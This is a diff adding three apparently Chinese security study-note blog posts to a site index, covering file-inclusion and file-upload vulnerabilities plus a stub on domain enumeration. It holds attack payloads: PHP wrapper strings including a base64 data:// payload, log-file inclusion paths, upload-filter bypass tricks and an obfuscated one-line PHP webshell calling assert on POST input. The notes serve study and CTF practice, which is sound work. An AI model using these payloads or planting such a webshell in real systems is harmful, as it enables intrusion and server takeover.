@@ -4,6 +4,63 @@
   
     
     <entry>
+      <title>学习文件包含漏洞</title>
+      <link href="/2023/02/27/learn-file-include-vulnerability/"/>
+      <url>/2023/02/27/learn-file-include-vulnerability/</url>
+      
+        <content type="html"><![CDATA[<h1>1.文件包含漏洞条件</h1><p>开发者在开发过程中，会将可以重复利用的函数或代码块写入到单个文件当中，在使用某些函数时，直接调用对应即可，无需再次编写，这种调用文件的过程称之为文件包含</p><ol><li>包含文件时采用动态包含的方式</li><li>对于包含的文件没有做详细的过滤和检验</li></ol><p>PHP文件包含函数：include()、 include_once()、 require()、 require_once()、 fopen()、 readfile()<br>通过以上函数包含文件，无论文件后缀是什么，都会以php的方式进行解析</p><p>其它语言的文件包含：</p><ol><li>JSP文件包含函数：java.io.file()、java.io.filereader()、include()，动态包含只支持包含web路径下的jsp文件</li><li>aspx文件包含函数：include file、include virtual，aspx和asp均不支持动态包含</li></ol><h1>2.文件包含漏洞分类</h1><h2 id="2-1-本地文件包含-LFI">2.1. 本地文件包含(LFI)</h2><p>包含文件和页面文件如果不在同一目录，包含的路径必须写相对路径或者绝对路径</p><p>被包含的文件的后缀无论是是什么都被被视作为PHP进行解析</p><p>本地包含任意文件 <code>../</code>、 <code>..\</code></p><p>追加后缀：%00截断，受限于php的版本</p><p>追加前缀：在文件路径前多一次跳转</p><p>包含日志文件：</p><ul><li>/var/log/apache2/access.log</li><li>/var/log/httpd/access.log</li><li>/var/log/nginx/access.log</li></ul><h2 id="2-2-远程文件包含-RFI">2.2. 远程文件包含(RFI)</h2><p>代码注入的一种，通过包含的方式远程注入一段用户可控的脚本在服务端执行</p><p>远程注入前提条件：</p><ul><li>allow_url_fopen ON</li><li>allow_url_include ON</li><li>包含的变量前没有目录的限制</li><li>远程包含文件路径必须为绝对路径</li><li>被包含的文件能被服务器解析</li></ul><p>临时启动http服务–python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">8000</span></span><br><span class="line">python2 -m SimpleHTTPServer <span class="number">8000</span></span><br></pre></td></tr></table></figure><p>伪协议利用：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://     //远程文件包含，python启用服务</span><br><span class="line">ftp://</span><br><span class="line">php://filter/read=convert.base64-encode/resource=</span><br><span class="line">file:///ect/passwd</span><br><span class="line">php://input</span><br><span class="line">phar://压缩包路径/文件名称</span><br><span class="line">zip://压缩包路径#文件名称    //记住#可能需要转码为%23</span><br><span class="line">data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=</span><br></pre></td></tr></table></figure><p>日志路径为常见路径/var/log/apache2/access.log，注意日志文件包含</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>域内基本信息查询及操作</title>
+      <link href="/2023/02/25/Querying-and-operating-basic-information-in-a-domain/"/>
+      <url>/2023/02/25/Querying-and-operating-basic-information-in-a-domain/</url>
+      
+        <content type="html"><![CDATA[<h1>1. 判断当前所在域</h1><p>查看计算机名、全名、用户名、系统版本、工作站、域、登录域: <code>net config workstation</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>学习文件上传漏洞</title>
+      <link href="/2023/02/25/learn-file-upload-vulnerability/"/>
+      <url>/2023/02/25/learn-file-upload-vulnerability/</url>
+      
+        <content type="html"><![CDATA[<h1>1.文件上传漏洞条件</h1><ol><li>上传文件的名称、后缀名、内容用户可以自定义设置；</li><li>上传文件的路径可以获取；</li><li>上传文件所在文件夹具备可执行权限；</li></ol><h1>2. Bypass 技巧</h1><ol><li>前端过滤</li></ol><p>抓包修改后缀名、禁用JS</p><ol start="2"><li>类型过滤</li></ol><p>上传图片马、修改后缀名<br>制作图片马: <code>copy 1.jpg/b+muma.php/a muma.jpg</code><br>图片类文件头: <code>GIF89a</code></p><ol start="3"><li>黑名单过滤</li></ol><p>禁用php后缀名时，使用畸形后缀名：phtml、php3、php4、php5、pht、php2</p><ol start="4"><li>上传 .htaccess 文件，更改解析配置</li></ol><p>AddType application/x-httpd-php .jpg：将 jpg 文件当成 php 进行解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">配置方式：</span><br><span class="line">1. 将 httpd.config 中的 Option FollowSymLinks 从 AllowOverride None 修改为 ALLowOverride all</span><br><span class="line">2. 将 LoadModule rewrite_module modules/mod_rewrite.so 前的 # 去除</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="5"><li>windows特性绕过</li></ol><p>windows保存文件时，后缀末尾不会保存 <code>.</code>、 <code>空格</code>、 <code>::$DATA</code></p><p>可以尝试将 <code>muma.php</code> 修改为：<code>muma.php.</code>、<code>muma.php空格</code>、<code>muma.php.空格.</code>、<code>muma.php::$DATA</code></p><ol start="6"><li>大小写绕过</li></ol><p>将 <code>php</code> 修改为 <code>phP</code>、<code>pHp</code> 等</p><ol start="7"><li><p>双写绕过</p></li><li><p>%00截断</p></li></ol><p>对 php 版本和配置有要求。PHP版本=5.2.17，且 php.ini 中 magic_quotes_gpc Off</p><ol start="9"><li>一些小知识</li></ol><p><strong>图片类文件头</strong>: <code>GIF89a</code></p><p><strong>命令执行函数</strong>:</p><table><thead><tr><th>函数名</th><th>作用</th></tr></thead><tbody><tr><td>eval</td><td>命令执行</td></tr><tr><td>system</td><td>命令执行</td></tr><tr><td>assert</td><td>与eval类似，assert函数是直接将传入的参数字符串当成PHP代码直接</td></tr><tr><td>exec</td><td>命令执行，需要打印输出执行结果，且它只会输出最后一行的内容</td></tr></tbody></table><p><strong>读取文件</strong>：<code>cat</code>、 <code>tac</code>、 <code>less</code>、 <code>more</code>、 <code>head</code>、 <code>tail</code>、 <code>strings</code>、 <code>paste</code>、 <code>nl</code>、 <code>//</code></p><p><strong>变量拼接</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;ass&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;ert&quot;</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$a</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>重新认识SQL注入</title>
       <link href="/2023/02/18/Relearn-sql-injection/"/>
       <url>/2023/02/18/Relearn-sql-injection/</url>
